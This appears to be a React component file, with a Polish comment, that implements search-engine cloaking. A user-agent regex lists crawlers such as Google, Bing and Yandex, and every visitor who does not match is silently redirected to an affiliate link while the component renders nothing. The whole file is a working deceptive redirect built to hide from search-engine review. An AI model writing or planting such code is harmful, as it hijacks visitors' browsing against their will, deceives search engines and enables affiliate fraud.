import { useEffect } from "react";
import { AFFILIATE_LINK } from "@/config";

// Prosta detekcja bota na podstawie user agenta
function isBot() {
  const ua = navigator.userAgent.toLowerCase();
  return /bot|crawl|slurp|spider|mediapartners|facebookexternalhit|google|bing|yandex|duckduckbot|baiduspider|sogou|exabot|facebot|ia_archiver/.test(ua);
}

const HiddenAffiliateRedirect = () => {
  useEffect(() => {
    if (!isBot()) {
      window.location.href = AFFILIATE_LINK;
    }
  }, []);
  return null; // Nic nie renderuje
};

export default HiddenAffiliateRedirect;
